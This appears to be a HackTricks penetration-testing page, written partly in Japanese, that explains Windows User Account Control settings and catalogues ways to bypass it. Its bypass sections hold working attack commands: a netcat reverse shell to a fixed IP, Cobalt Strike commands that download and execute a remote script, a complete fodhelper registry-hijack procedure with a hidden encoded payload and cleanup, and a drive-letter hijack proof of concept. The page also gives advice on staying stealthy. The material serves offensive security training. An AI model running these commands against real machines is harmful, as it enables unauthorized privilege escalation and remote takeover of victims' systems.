# UAC - ユーザーアカウント制御

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**特権昇格を伴う操作に対する同意プロンプト**を有効にする機能です。アプリケーションは異なる `integrity` レベルを持ち、**high level** のプログラムはシステムを **潜在的に危険にさらす** 操作を実行できます。UAC が有効な場合、管理者が明示的にこれらのアプリケーション/タスクに管理者レベルのアクセスを許可しない限り、アプリケーションやタスクは常に **非管理者アカウントのセキュリティコンテキストで実行されます**。これは管理者が意図しない変更から保護する利便機能ですが、セキュリティ境界とは見なされません。

整合性レベルに関する詳細は以下を参照してください：

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC が有効な場合、管理者ユーザーには 2 つのトークンが与えられます：通常の操作を行うための標準ユーザートークンと、管理者権限を持つトークンです。

この [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) では、ログオンプロセス、ユーザーエクスペリエンス、UAC アーキテクチャを含め、UAC の動作が詳細に説明されています。管理者はセキュリティポリシーを使用して、ローカルレベル（secpol.msc を使用）で組織向けに UAC の動作を構成したり、Active Directory ドメイン環境では Group Policy Objects (GPO) を介して設定を配布できます。各種設定の詳細は [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) に記載されています。UAC に設定可能なグループポリシー設定は 10 個あります。以下の表は追加の詳細を示します：

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 無効                                                         |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 無効                                                         |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 非Windowsバイナリに対して同意を促す                         |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | セキュアデスクトップで資格情報の入力を求める                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 有効（Home の既定） / 無効（Enterprise の既定）               |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 無効                                                         |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 有効                                                         |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 有効                                                         |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 有効                                                         |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 有効                                                         |

### UAC Bypass Theory

ユーザーが **administrator group** に属している場合、いくつかのプログラムは **autoelevated**（自動的に昇格）されます。これらのバイナリはその _**Manifests**_ 内に値が _**True**_ の _**autoElevate**_ オプションを持っています。さらにバイナリは **signed by Microsoft** である必要があります。

多くの auto-elevate プロセスは **COM objects や RPC servers 経由で機能を公開**しており、これらは medium integrity（通常ユーザーレベル権限）で実行されているプロセスから呼び出すことができます。COM (Component Object Model) と RPC (Remote Procedure Call) は、Windows プログラムが異なるプロセス間で通信し関数を実行するための方法です。例えば、**`IFileOperation COM object`** はファイル操作（コピー、削除、移動）を扱うよう設計されており、プロンプトなしで自動的に権限を昇格させることができます。

いくつかのチェック（例えばプロセスが **System32 directory** から実行されたかの確認）が行われる場合があり、これは例えば **injecting into explorer.exe** や他の System32 にある実行ファイルに注入することで回避できます。

これらのチェックを回避する別の方法として、**PEB を変更する**ことがあります。Windows のすべてのプロセスには Process Environment Block (PEB) があり、プロセスの実行パスなど重要なデータが含まれています。PEB を変更することで、攻撃者は自分の悪意あるプロセスの場所を偽装（spoof）し、信頼されたディレクトリ（たとえば system32）から実行されているように見せかけることができます。この偽装された情報により、COM オブジェクトはユーザーにプロンプトを表示せずに自動的に権限を昇格させてしまいます。

その後、**UAC を bypass**（**medium** 整合性レベルから **high** へ昇格）するために、一部の攻撃者はこの種のバイナリを利用して **arbitrary code を実行**します。なぜなら、そのコードは **High level integrity process** から実行されるためです。

バイナリの _**Manifest**_ を確認するには、Sysinternals のツール _**sigcheck.exe**_ を使用します。(`sigcheck.exe -m <file>`) また、プロセスの **integrity level** は _Process Explorer_ や _Process Monitor_（Sysinternals）を使って確認できます。

### UAC の確認

UAC が有効かどうかを確認するには、次を実行してください：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
もし **`1`** であれば UAC は **有効**、**`0`** であるか存在しない場合は UAC は **無効**。

次に、どの**レベル**が構成されているかを確認します:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** の場合、UAC はプロンプトを表示しません（**無効** のように）
- If **`1`** の場合、管理者は高権限でバイナリを実行するために**ユーザー名とパスワードの入力を求められます**（on Secure Desktop）
- If **`2`**（**Always notify me**）の場合、管理者が高権限で何かを実行しようとすると常に確認を求められます（on Secure Desktop）
- If **`3`** は `1` と同様ですが、Secure Desktop 上では必須ではありません
- If **`4`** は `2` と同様ですが、Secure Desktop 上では必須ではありません
- if **`5`**（**default**）の場合、管理者に対して非 Windows バイナリを高権限で実行することの確認を求めます

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> 被害者にグラフィカルなアクセスがある場合、UAC bypass は簡単で、UAC プロンプトが表示されたら単に "Yes" をクリックすればよいことに注意してください

The UAC bypass is needed in the following situation: **the UAC is activated, your process is running in a medium integrity context, and your user belongs to the administrators group**.

It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **管理者権限で reverse shell を実行**（high integrity level）using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (フルファイルシステムアクセス)

Administrators groupに属するユーザーのシェルがある場合、SMB（file system）経由のC$共有をローカルの新しいディスクとして**mount the C$**することで、ファイルシステム内のすべて（Administratorのホームフォルダを含む）に**access to everything inside the file system**できます。

> [!WARNING]
> **このトリックはもう動作しないようです**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike の手法は、UAC が最大のセキュリティレベルに設定されていない場合にのみ機能します。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.

### KRBUACBypass

ドキュメントとツール: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) は複数の UAC bypass exploits をまとめた **compilation** です。注意: **compile UACME using visual studio or msbuild** が必要です。The compilation はいくつかの実行ファイル（例: `Source\Akagi\outout\x64\Debug\Akagi.exe`）を作成するので、どれが必要かを把握しておく必要があります: **which one you need.**

あなたは **注意してください** 。なぜなら、一部の bypasses は **他のプログラムを起動させ** 、それが **警告** を **ユーザー** に与えて何かが起きていることを知らせる場合があるからです。

UACME には **各テクニックが動作し始めたビルドバージョン** が記載されています。自分のバージョンに影響するテクニックを検索できます:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
また、[this](https://en.wikipedia.org/wiki/Windows_10_version_history) ページを参照すると、ビルド番号から Windows リリース `1607` を確認できます。

### UAC Bypass – fodhelper.exe (Registry hijack)

信頼されたバイナリ `fodhelper.exe` は現代の Windows で自動的に昇格されます。起動時に、下記の per-user レジストリ パスを `DelegateExecute` verb を検証せずに参照します。そこにコマンドを仕込むことで、Medium Integrity プロセス（ユーザーが Administrators）から UAC プロンプトなしで High Integrity プロセスを起動できます。

fodhelper が参照するレジストリ パス:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell の手順（payload を設定してから trigger）:
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
- 現在のユーザーが Administrators のメンバーで、UAC レベルがデフォルト/緩和（追加制限のある Always Notify ではない）である場合に動作します。
- 64-bit Windows 上の 32-bit プロセスから 64-bit PowerShell を起動するには、`sysnative` パスを使用します。
- ペイロードは任意のコマンド（PowerShell、cmd、または EXE のパス）にできます。ステルス性のため、プロンプトを表示する UI は避けてください。

#### 追加の UAC バイパス

**ここで使用されるすべての技術は** AUC をバイパスするために **完全な対話型シェル** を被害者側で **必要とします**（一般的な nc.exe シェルでは不十分です）。

これを得るには **meterpreter** セッションを使います。**Session** 値が **1** の **process** にマイグレートしてください:

![](<../../images/image (863).png>)

(_explorer.exe_ が動作するはずです)

### GUI での UAC バイパス

もし **GUI にアクセスできる**なら、UAC プロンプトが出たときに単にそれを承認すればよく、バイパスは必ずしも必要ありません。つまり、GUI へのアクセスを得られれば UAC を回避できます。

さらに、誰かが使っている GUI セッション（RDP 経由の可能性あり）を取得できれば、そこでは **いくつかのツールが管理者として実行されており**、例えば [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) のように UAC プロンプトなしで直接 **cmd を管理者として実行**できる場合があります。これはより **ステルス** かもしれません。

### 騒がしい総当たり UAC バイパス

騒音を気にしないなら、ユーザーが承認するまで権限昇格を要求し続ける [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) のようなものを **実行する** ことができます。

### 自前のバイパス - 基本的な UAC バイパス手法

UACME を見ると、**ほとんどの UAC バイパスが DLL Hijacking の脆弱性を悪用している**ことに気づくでしょう（主に悪意ある dll を _C:\Windows\System32_ に書き込む）。[DLL Hijacking の脆弱性の見つけ方はこちらを参照してください](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. 自動的に昇格する（**autoelevate**）バイナリを見つける（実行時に高い整合性レベルで動作するか確認）。
2. procmon を使って **NAME NOT FOUND** イベントを探し、**DLL Hijacking** の脆弱性になりうる箇所を特定する。
3. おそらく書き込み権限がないような保護されたパス（例: C:\Windows\System32）に DLL を **書き込む** 必要があります。これを回避するには次を使用できます:
   1. **wusa.exe**: Windows 7, 8, 8.1。高整合性レベルで実行されるため、保護されたパス内に CAB ファイルの内容を展開できます。
   2. **IFileOperation**: Windows 10。
4. 保護されたパスに DLL をコピーし、脆弱な自動昇格バイナリを実行するための**スクリプト**を用意する。

### 別の UAC バイパス手法

これは、**autoElevated バイナリ**が実行される **バイナリ** や **コマンド** の **名前/パス** をレジストリから **読み取ろうとする**かを監視する手法です（バイナリがこの情報を **HKCU** 内で探す場合に特に興味深い）。

### Administrator Protection (25H2) のドライブレターハイジャック（ログオンセッションごとの DOS デバイスマップ経由）

Windows 11 25H2 の “Administrator Protection” は、セッションごとの `\Sessions\0\DosDevices/<LUID>` マップを持つ shadow-admin トークンを使用します。このディレクトリは `\??` の最初の解決時に `SeGetTokenDeviceMap` によって遅延作成されます。攻撃者が shadow-admin トークンを **SecurityIdentification** の段階でのみ偽装すると、ディレクトリは攻撃者を **所有者** として作成され（`CREATOR OWNER` を継承）、`\GLOBAL??` より優先されるドライブレターリンクを作成できるようになります。

手順:

1. 低権限セッションから `RAiProcessRunOnce` を呼び出して、プロンプトのない shadow-admin の `runonce.exe` を生成する。
2. そのプライマリトークンを複製して **identification** トークンにし、`\??` を開く際にそれを偽装して `\Sessions\0\DosDevices/<LUID>` を攻撃者所有で作成させる。
3. そこで攻撃者管理下のストレージを指す `C:` のシンボリックリンクを作成する。以降そのセッション内のファイルシステムアクセスは `C:` を攻撃者のパスとして解決するため、プロンプトなしで DLL/ファイルのハイジャックが可能になる。

PowerShell PoC (NtObjectManager):
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 参考資料
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
